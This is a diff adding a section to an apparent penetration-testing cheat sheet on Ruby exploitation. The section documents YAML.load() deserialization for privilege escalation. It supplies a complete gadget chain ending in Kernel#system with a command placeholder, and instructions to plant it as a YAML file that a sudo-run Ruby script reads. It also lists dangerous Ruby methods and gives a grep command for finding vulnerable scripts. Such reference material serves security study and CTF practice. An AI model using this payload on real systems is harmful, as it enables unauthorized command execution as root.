@@ -511,6 +511,37 @@ Marshal.load(payload)
         → Kernel#load("|command")  # Pipe triggers system execution
 ```
 
+### Ruby YAML.load() Deserialization (Privilege Escalation)
+
+`YAML.load()` (vs safe `YAML.safe_load()`) allows arbitrary Ruby object instantiation. Common privesc vector: sudo Ruby scripts that parse YAML from CWD.
+
+**Gadget chain** (Gem::Requirement → Gem::RequestSet → Kernel#system):
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+    requirements:
+      !ruby/object:Gem::Package::TarReader
+      io: &1 !ruby/object:Net::BufferedIO
+        io: &1 !ruby/object:Gem::Package::TarReader::Entry
+           read: 0
+           header: "abc"
+        debug_output: &1 !ruby/object:Net::WriteAdapter
+           socket: &1 !ruby/object:Gem::RequestSet
+               sets: !ruby/object:Net::WriteAdapter
+                   socket: !ruby/module "Kernel"
+                   method_id: :system
+               git_set: COMMAND_HERE
+           method_id: :resolve
+```
+
+**Exploitation**: Write malicious YAML as `dependencies.yml` (or whatever filename the script reads) in a writable directory, `cd` there, then run the sudo script. Replace `COMMAND_HERE` with target command.
+
+**Detection**: `grep -r "YAML.load" /opt /usr/local --include="*.rb"` — any Ruby script using `YAML.load()` on user-controllable input is vulnerable.
+
 ### Ruby Dangerous Methods
 
 ```ruby
@@ -532,7 +563,7 @@ Kernel.load("|cmd")  # With pipe prefix
 # Deserialization
 Marshal.load(data)
 Marshal.restore(data)
-YAML.load(data)  # Also dangerous
+YAML.load(data)  # Also dangerous — see YAML.load() section above
 ```
 
 ### Rails-Specific Exploits
